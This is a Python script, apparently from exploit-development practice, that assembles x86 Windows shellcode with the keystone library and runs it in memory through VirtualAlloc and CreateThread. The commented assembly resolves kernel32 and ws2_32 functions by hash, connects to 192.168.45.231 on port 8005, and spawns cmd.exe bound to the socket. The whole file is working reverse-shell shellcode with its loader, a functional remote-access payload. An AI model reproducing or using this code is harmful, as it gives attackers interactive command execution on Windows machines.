import ctypes, struct
import keystone

### assembly code ###
CODE = (
        "start:                  " #
        "   int3                ;" # DEBUGGING PURPOSES: Interrupt exec to attach debugger
        "   jmp main            ;" # jump down to main function

        "find_module:            " # find module (kernel32.dll) from PEB LDR
        "   xor ecx, ecx        ;" # zero out ecx
        "   mov esi,fs:[ecx+30h];" # PEB address (0x30 into the TEB)
        "   mov esi,[esi+0Ch]   ;" # Ldr address from PEB (0xC into PEB)
        "   mov esi,[esi+1Ch]   ;" # InItOrder head node from Ldr (0x1C into PEB_LDR_DATA)
        "next_module:            " #
        "   mov ebx, [esi+8h]   ;" # module base address of the node
        "   mov edi, [esi+20h]  ;" # module name
        "   mov esi, [esi]      ;" # flink entry
        "   cmp [edi+12*2], cx  ;" # check for null byte at word 12 (byte 24) of module name 
                                   # (terminating word for KERNEL32.DLL in unicode)
        "   jne next_module     ;" # move on to next module if no match
        "   ret                 ;" #
        
        "find_func:              " #
        "   pushad              ;" # store registers
        "   mov eax, [ebx+0x3c] ;" # offset to PE Header start
        "   mov edi, [ebx+eax+0x78];" # offset (RVA) to EAT (Export Address Table)
        "   add edi, ebx        ;" # address (VMA) of EAT 
        "   mov ecx, [edi+0x18] ;" # NumberOfNames
        "   mov eax, [edi+0x20] ;" # AddressOfNames offset
        "   add eax, ebx        ;" # AddressOfNames start address
        "   mov [ebp-4], eax    ;" # save AddressOfNames to stack
        "find_func_loop:         " #
        "   jecxz find_func_done;" # if ECX 0, jump out of loop
        "   dec ecx             ;" # dec NumberOfNames counter
        "   mov eax, [ebp-4]    ;" # retrieve AddressOfNames start address
        "   mov esi, [eax+ecx*4];" # AddressOfNames[NumOfNames_counter] offset
        "   add esi, ebx        ;" # AddressOfNames[x] address
        "hash_prep:             ;" #
        "   xor eax, eax        ;" # zero out eax
        "   cdq                 ;" # zero out edx (convert dword to qword)
        "   cld                 ;" # clear direction flag, string parse direction
        "hash_loop:             ;" #
        "   lodsb               ;" # load next byte from esi into al
        "   test al, al         ;" # check for null terminator byte
        "   jz hash_compare     ;" # exit if null
        "   ror edx, 0x0d       ;" # rotate edx (working hash) 13 bits right
        "   add edx, eax        ;" # add string byte to hash
        "   jmp hash_loop       ;" # loop   
        "hash_compare:           " #
        "   cmp edx, [esp+0x24] ;" # compare computed hash to pushed hash
        "   jnz find_func_loop  ;" # if not equal, go to next func
        "find_func_base:         " # 
        "   mov edx, [edi+0x24] ;" # AddressOfNameOrdinals offset
        "   add edx, ebx        ;" # AddressOfNameOrdinals start address
        "   mov cx, [edx+2*ecx] ;" # ordinal = AddressOfNameOrdinals[NumOfNames_counter]
        "   mov edx, [edi+0x1c] ;" # AddressOfFunctions offset
        "   add edx, ebx        ;" # AddressOfFunctions start address
        "   mov eax, [edx+4*ecx];" # AddressOfFunctions[ordinal] = function offset
        "   add eax, ebx        ;" # function address 
        "   mov [esp+0x1c], eax ;" # mov function address into stored stack value of eax (for popad)
        "find_func_done:         "
        "   popad               ;" # restore registers
        "   ret                 ;" #


        "main:                  ;" # main at the bottom for upward calls (avoid null bytes)
        "   mov ebp, esp        ;" # move up the base pointer to imitate a function call
        "   add esp, 0xfffffdf0 ;" # move the stack pointer -0x210 to avoid stack clobbering
        "kernel32_funcs:         " #
        "   call find_module    ;" # find kernel32.dll base address
        "   push 0xec0e4e8e     ;" # LoadLibraryA hash
        "   call find_func      ;" # find LoadLibraryA in kernel32.dll
        "   mov [ebp+0x10], eax ;" # save LoadLibraryA address to stack
        "   push 0x16b3fe72     ;" # CreateProcessA hash
        "   call find_func      ;" # find CreateProcessA in kernel32.dll
        "   mov [ebp+0x14], eax ;" # save CreateProcessA address to stack
        "   push 0x78b5b983     ;" # TerminateProcess hash
        "   call find_func      ;" # find TerminateProcess in kernel32.dll
        "   mov [ebp+0x18], eax ;" # save TerminateProcess address to stack
        "load_ws2:               " #
        "   xor eax, eax        ;" # zero out eax
        "   mov ax, 0x6c6c      ;" # "ll" into eax
        "   push eax            ;" # "ll\x00\x00"
        "   push 0x642e3233     ;" # "32.d"
        "   push 0x5f327377     ;" # "ws2_"
        "   push esp            ;" # pointer to "ws2_32.dll"
        "   call dword ptr [ebp+0x10];" # call LoadLibraryA with ws2_32.dll
        "   mov ebx, eax        ;" # move ws2_32.dll
        "ws2_funcs:              " #
        "   push 0x3bfcedcb     ;" # WSAStartup hash
        "   call find_func      ;" # find WSAStartup in kernel32.dll
        "   mov [ebp+0x1c], eax ;" # save WSAStartup address to stack
        "   push 0xadf509d9     ;" # WSASocketA hash
        "   call find_func      ;" # find WSASocketA in kernel32.dll
        "   mov [ebp+0x24], eax ;" # save WSASocketA address to stack
        "   push 0xb32dba0c     ;" # WSAConnect hash
        "   call find_func      ;" # find WSAConnect in kernel32.dll
        "   mov [ebp+0x28], eax ;" # save WSAConnect address to stack
        "call_wsastartup:        " #
        "   mov eax, esp        ;" #  
        "   mov cx, 0x590       ;" # 
        "   sub eax, ecx        ;" # provide high stack address to avoid clobbering
        "   push eax            ;" # lpWSAData [out] 
        "   xor eax, eax        ;" #
        "   mov eax, 0x0202     ;" # 
        "   push eax            ;" # wVersionRequired = 2.2
        "   call [ebp+0x1c]     ;" # call WSAStartup
        "call_wsasocketa:         " # 
        "   xor eax, eax        ;" #
        "   push eax            ;" # dwflags
        "   push eax            ;" # g "GROUP"
        "   push eax            ;" # lpProtocolInfo
        "   mov al, 0x06        ;" # 
        "   push eax            ;" # protocol = IPPROTO_TCP
        "   sub al, 0x05        ;" # 
        "   push eax            ;" # type = SOCKET_STREAM
        "   inc eax             ;" # 
        "   push eax            ;" # af = AF_INET
        "   call [ebp+0x24]     ;" # call WSASocket
        "   mov esi, eax        ;" # save returned socket descriptor
        "call_wsaconnect:        " #
        "   xor eax, eax        ;" #
        "   push eax            ;" # sin_zero[4]
        "   push eax            ;" # sin_zero[8]
        "   push 0xe72da8c0     ;" # in_addr = 192.168.45.231
        "   mov eax, 0x451f     ;" # sin_port = 8005
        "   shl eax, 0x10       ;" # shift to high bytes of the word
        "   add al, 0x02        ;" # sin_family = 0x02 (AF_INET)
        "   push eax            ;" # sin_port & sin_family 
        "   mov edi, esp        ;" # save sockaddr_in address
        "   xor eax, eax        ;" # 
        "   push eax            ;" # lpGQOS
        "   push eax            ;" # lpSQOS
        "   push eax            ;" # lpCalleeData
        "   push eax            ;" # lpCallerData
        "   add al, 0x10        ;" #
        "   push eax            ;" # namelen = 0x10 (byte len of sockaddr struct) 
        "   push edi            ;" # *name (sockaddr_in)
        "   push esi            ;" # s "SOCKET"
        "   call [ebp+0x28]     ;" # call WSAConnect 
        "cpa_startupinfoa:       " #
        "   push esi            ;" # hStdError
        "   push esi            ;" # hStdOutput
        "   push esi            ;" # hStdInput
        "   xor eax, eax        ;" # 
        "   push eax            ;" # lpReserved2
        "   push eax            ;" # cbReserved2 & wShowWindow
        "   add eax, 0x80       ;" #
        "   add eax, 0x80       ;" #
        "   push eax            ;" # dwFlags = STARTF_USESTDHANDLES (0x100)
        "   xor eax, eax        ;" #
        "   push eax            ;" # dwFillAttribute
        "   push eax            ;" # dwYCountChars
        "   push eax            ;" # dwXCountChars
        "   push eax            ;" # dYSize 
        "   push eax            ;" # dXSize
        "   push eax            ;" # dwY
        "   push eax            ;" # dwX
        "   push eax            ;" # lpTitle
        "   push eax            ;" # lpDesktop
        "   push eax            ;" # lpReserved
        "   mov al, 0x44        ;" # 
        "   push eax            ;" # cb (size of STARTUPINFOA struct)
        "   mov edi, esp        ;" # save STARTUPINFOA address
        "cpa_create_cmd_str:     " # 
        "   mov eax, 0xff9a879b ;" #
        "   neg eax             ;" #
        "   push eax            ;" # "exe\x00"
        "   push 0x2e646d63     ;" # cmd."
        "   mov ebx, esp        ;" # save "cmd.exe" string address
        "call_createprocessa:    " # 
        "   mov eax, esp        ;" #
        "   xor ecx, ecx        ;" #
        "   mov ecx, 0x390      ;" #
        "   add eax, ecx        ;" #
        "   push eax            ;" # lpProcessInformation
        "   push edi            ;" # lpStartupInfo
        "   xor eax, eax        ;" # 
        "   push eax            ;" # lpCurrentDirectory
        "   push eax            ;" # lpEnvironment
        "   push eax            ;" # dwCreationFlags
        "   inc eax             ;" # 
        "   push eax            ;" # bInheritHandles = TRUE
        "   dec eax             ;" # 
        "   push eax            ;" # lpThreadAttributes
        "   push eax            ;" # lpProcessAttributes
        "   push ebx            ;" # lpCommandLine
        "   push eax            ;" # lpApplicationName
        "   call [ebp+0x14]     ;" # call CreateProcessA
        "call_terminateprocess:  " # 
        "   xor ecx, ecx        ;" # zero out ecx
        "   push ecx            ;" # uExitCode
        "   push 0xffffffff     ;" # hProcess
        "   call eax            ;" # call TerminateProcess
        "   ret                 ;" #
        )


### generate shellcode ###
# init engine in x86-32bit mode
ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e) # add each byte object from an unsigned char (B)
shellcode = bytearray(sh)


### makes the shellcode executable ###
# allocate mem page with PAGE_EXEC_READWRITE perms, returns a pointer
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
# tbh not sure here, but makes a ctype compatible buffer space from the shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
# move the buffer into the memory page
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))


### executes the shellcode ###
print("Shellcode located at address %s" % hex(ptr))
choice = "x"
while choice != "":
    choice = input("...PRESS ENTER TO EXECUTE SHELLCODE...")
    if choice == "c":
        print(shellcode)

# creates the thread environment for the shellcode to run
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

